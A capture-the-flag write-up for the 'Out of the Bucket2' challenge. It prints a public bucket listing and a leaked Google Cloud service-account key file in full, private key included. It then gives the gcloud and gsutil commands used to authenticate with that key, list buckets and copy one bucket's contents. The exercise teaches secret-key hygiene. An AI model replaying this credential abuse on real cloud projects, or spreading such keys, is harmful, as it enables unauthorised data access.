# Out of the Bucket2

![Alt text](<Web capture_15-1-2024_204653_play.uoftctf.org.jpeg>)

this challenge is continuation of the previous challenge  "Out of the Bucket"

going back to the xml file:

```xml
<ListBucketResult xmlns="http://doc.s3.amazonaws.com/2006-03-01">
<Name>out-of-the-bucket</Name>
<Prefix/>
<Marker/>
<IsTruncated>false</IsTruncated>
<Contents>
<Key>secret/</Key>
<Generation>1703868492595821</Generation>
<MetaGeneration>1</MetaGeneration>
<LastModified>2023-12-29T16:48:12.634Z</LastModified>
<ETag>"d41d8cd98f00b204e9800998ecf8427e"</ETag>
<Size>0</Size>
</Contents>
<Contents>
<Key>secret/dont_show</Key>
<Generation>1703868647771911</Generation>
<MetaGeneration>1</MetaGeneration>
<LastModified>2023-12-29T16:50:47.809Z</LastModified>
<ETag>"737eb19c7265186a2fab89b5c9757049"</ETag>
<Size>29</Size>
</Contents>
<Contents>
<Key>secret/funny.json</Key>
<Generation>1705174300570372</Generation>
<MetaGeneration>1</MetaGeneration>
<LastModified>2024-01-13T19:31:40.607Z</LastModified>
<ETag>"d1987ade72e435073728c0b6947a7aee"</ETag>
<Size>2369</Size>
</Contents>
<Contents>
<Key>src/</Key>
<Generation>1703867253127898</Generation>
<MetaGeneration>1</MetaGeneration>
<LastModified>2023-12-29T16:27:33.166Z</LastModified>
<ETag>"d41d8cd98f00b204e9800998ecf8427e"</ETag>
<Size>0</Size>
</Contents>
<Contents>
<Key>src/index.html</Key>
<Generation>1703867956175503</Generation>
<MetaGeneration>1</MetaGeneration>
<LastModified>2023-12-29T16:39:16.214Z</LastModified>
<ETag>"dc63d7225477ead6f340f3057263643f"</ETag>
<Size>1134</Size>
</Contents>
<Contents>
<Key>src/static/antwerp.jpg</Key>
<Generation>1703867372975107</Generation>
<MetaGeneration>1</MetaGeneration>
<LastModified>2023-12-29T16:29:33.022Z</LastModified>
<ETag>"cef4e40eacdf7616f046cc44cc55affc"</ETag>
<Size>45443</Size>
</Contents>
<Contents>
<Key>src/static/guam.jpg</Key>
<Generation>1703867372954729</Generation>
<MetaGeneration>1</MetaGeneration>
<LastModified>2023-12-29T16:29:32.993Z</LastModified>
<ETag>"f6350c93168c2955ceee030ca01b8edd"</ETag>
<Size>48805</Size>
</Contents>
<Contents>
<Key>src/static/style.css</Key>
<Generation>1703867372917610</Generation>
<MetaGeneration>1</MetaGeneration>
<LastModified>2023-12-29T16:29:32.972Z</LastModified>
<ETag>"0c12d00cc93c2b64eb4cccb3d36df8fd"</ETag>
<Size>76559</Size>
</Contents>
</ListBucketResult>
```

we can see also a json file named `funny.json` in the `secret` directory.

when we access that file we get

```json
{
    "type": "service_account",
    "project_id": "out-of-the-bucket",
    "private_key_id": "21e0c4c5ef71d9df424d40eed4042ffc2e0af224",
    "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDWxpWEDNiWgMzz\nxDDF64CspqiGPxkrHfhS4/PX8BrxNjUMPAH7vYHE3KbgQsmPhbCte9opnSLdMqec\nWjll8lRZGEy73xhWd2e3tVRAf53r+pW/p6MTOsz3leUkQAscG4hmOVOpGb1AkfuE\n62NErJVZIgQCowrBdFGbPxQc/IRQJKzrCFfKOWSHLvnngr4Ui5CSr6OM33dfpD+v\nQSLkEQheYCXmHwh/Wf8b27be+RzfOp/hOyjKsJOmDvFu2+rrx24t8hCptof3BYol\nUjpaiB8Qcct/HoKOEvZ/S5rW6toQizP8t4t7urC2i70JdH+Y4Qw/AZJNuLo/5wW1\n+x8i3FIDAgMBAAECggEABaGapVC06RVNdQ1tffL+d7MS8296GHWmX34B6bqDlP7S\nhenuNLczoiwVkAcQQ9wXKs/22Lp5rIpkd1FXn0MAT9RhnAIYdZlB4JY3iaK5oEin\nXn67Dt5Ze3BfBq6ghpx43L1KDUKogfs8jgVMoANVEyDfhrYsVQWDZ5T60QZp7bP2\n0zSDSACZpFzdf1vXzOhero8ykwM3keQiCIKWYkeMGsX8oHyWr1fz7AkU+pLciV67\nek10ItJUV70n2C65FgrW2Z1TpPKlpNEm8jQLSax9Bi89HuFEw8UjTfxKKzhLFXEu\nudtAyebt/PC4HS9FLBioo3bAy8vL3o00b7+raVyJQQKBgQD3IWaD5q5s7H0r10S/\n7IUhP1TDYhbLh7pupbzDGzu9wCFCMItwTEm9nYVNToKwV+YpeyoptEHQa4CAVp21\nO4+W7mBQgYemimjTtx1bIW8qzdQ9+ltQXyFAxj6m3KcuAsAzSpcHkbP46lCL5QoT\nTS6T06Fs4xvnTKtBdPeisSgiIwKBgQDee+mp5gsk8ynnp6fx0/liuO3AZxpTYcP8\nixaXLQI6CI4jQP2+P+FWNCTmEJxMaddXNOmmTaKu25S2H0KKMiQkQPuwBqskck3J\npVTHudnUuZAZWE7YPg40MJgg5OQhMVwiqGWL76FT2bubIdNm4LQyxvDeK82XQYl8\nszeOXfJeoQKBgGQqSoXdwwbtF5Lkbr4nnJIsPCvxHvIhskPUs1yVNjKjpBdS28GJ\nej37kaMS1k+pYOWhQSakJCTY3b2m3ccuO/Xd6nXW+mdbJD/jsWdVdtxvjr4MMmSy\nGiVJ9Ozm9G/mt4ZSjkKIIN0cA8ef7uSB3QYXug8LQi0O2z7trM1pZq3nAoGAMPhD\nOSMqRsrC6XtMivzmQmWD5zqKX9oAAmE26rV8bPufFYFjmHGFDq1RhdYYIPWW8Vnz\nJ6ik6ynntKJyyeo5bEVlYJxHJTGHj5+1ZnSwzpK9dearDAu0oqYjhfH7iJbNuc8o\n8sEe2E7vbTjnyBgjcZ26PJyVlvpU4b6stshU5aECgYEA7ZESXuaNV0Er3emHiAz4\noEStvFgzMDi8dILH+PtC3J2EnguVjMy2fceQHxQKP6/DCFlNqf9KUNqJBKVGxRWP\nIM1rcoAmf0sGQ5gl1B1K8PidhOi3dHF0nkYvivuMoj7sEyr9K88y69kdpVJ3J556\nJWqkWLCz8hx+LcQPfDJu0YE=\n-----END PRIVATE KEY-----\n",
    "client_email": "image-server@out-of-the-bucket.iam.gserviceaccount.com",
    "client_id": "102040203348783466577",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/image-server%40out-of-the-bucket.iam.gserviceaccount.com",
    "universe_domain": "googleapis.com"
}
```
this file is [google cloud service account key](https://cloud.google.com/iam/docs/keys-create-delete)

lets try if its valid or not. we can do that by installing [Google cloud SDK](https://cloud.google.com/sdk?hl=en) or directly from cloud shell in [Google cloud console](https://console.cloud.google.com/)

by following the steps in GCP documentation we can authenticate gcloud using a service account by using this command

`gcloud auth activate-service-account image-server@out-of-the-bucket.iam.gserviceaccount.com  --key-file=funny.json`

notice that we used the email address of the service account (in the `funny.json` file) and the file `funny.json` it self.

after that we need to see what permission we have with this service account.

first I tried to see if this service account has access to the full project (am not sure if that even possible or if this is the proper way to do it) 

`gcloud config set project out-of-the-bucket`

after that lets list all the buckets 

`gcloud storage ls`

and we have 2 buckets

![Alt text](<Web capture_16-1-2024_01242_console.cloud.google.com.jpeg>)

now lets copy the content of the bucket

`gsutil cp -r gs://flag-images/* .`

after that we can download the content and find this

![Alt text](xa.png)

This was grate challenge to show the importance of managing secret keys.